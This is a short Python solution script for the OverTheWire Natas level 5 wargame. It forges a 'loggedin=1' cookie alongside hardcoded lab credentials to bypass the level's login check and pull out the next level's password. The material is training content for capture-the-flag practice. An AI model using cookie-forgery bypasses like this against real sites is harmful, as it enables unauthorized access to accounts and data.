import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas5.natas.labs.overthewire.org'
KEYWORD = 'natas6'

def exploit(host, credentials):
    try:
        logged_in = dict(loggedin='1')
        response = requests.get(host,
                                auth=HTTPBasicAuth(*credentials),
                                cookies=logged_in)

        response_lines = response.content.decode('ascii').split('\n')
        return next((line for line in response_lines if KEYWORD in line),
                    'Keyword not found.')
    except Exception as e:
        print(e)

def main():
    credentials = ('natas5', 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq')
    print(exploit(HOST, credentials))

main()